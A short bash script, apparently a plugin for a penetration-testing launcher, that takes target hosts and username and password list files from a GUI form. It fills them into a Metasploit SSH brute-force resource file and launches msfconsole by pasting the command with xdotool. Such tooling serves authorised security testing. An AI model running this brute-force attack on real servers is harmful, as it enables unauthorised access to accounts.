#!/bin/bash

: '
ssh: bruteforce username file and passwords file
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
RHOSTS_FIELD=$(form_item  "RHOSTS" "RHOSTS")
USER_FILE_FIELD=$(form_item  "USER_FILE" "USER_FILE")
PASS_FILE_FIELD=$(form_item  "PASS_FILE" "PASS_FILE")

# Generate GUI form
generate_form "${RHOSTS_FIELD}" "${USER_FILE_FIELD}" "${PASS_FILE_FIELD}"

RHOSTS=${form_data["RHOSTS"]}
USER_FILE=${form_data["USER_FILE"]}
PASS_FILE=${form_data["PASS_FILE"]}

FILES_FOLDER="${SCRIPTS_DIR}/ssh/.files"

# Define replacement fields
REPLACE_FIELDS=(
    "[USER_FILE]" "${USER_FILE}"
    "[PASS_FILE]" "${PASS_FILE}"
    "[RHOSTS]" "${RHOSTS}"
)

find_and_replace_file "${FILES_FOLDER}" "msfconsole_brute_force_ssh_user_file_pass_file" "${REPLACE_FIELDS[@]}"

paste_command "msfconsole -r ${TMP_FILE}"
xdotool key Return
